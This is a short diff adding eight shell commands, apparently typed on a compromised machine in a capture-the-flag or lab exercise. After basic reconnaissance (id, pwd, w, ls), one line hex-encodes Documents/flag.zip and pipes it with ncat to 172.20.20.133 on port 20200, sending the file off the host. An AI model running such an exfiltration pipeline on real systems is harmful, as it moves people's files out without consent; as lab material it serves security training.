@@ -1,0 +1,8 @@
+id
+pwd
+w
+ls
+ls Documents
+file Documents/flag.zip
+xxd -p Documents/flag.zip | tr -d '\n' | ncat 172.20.20.133 20200
+exit
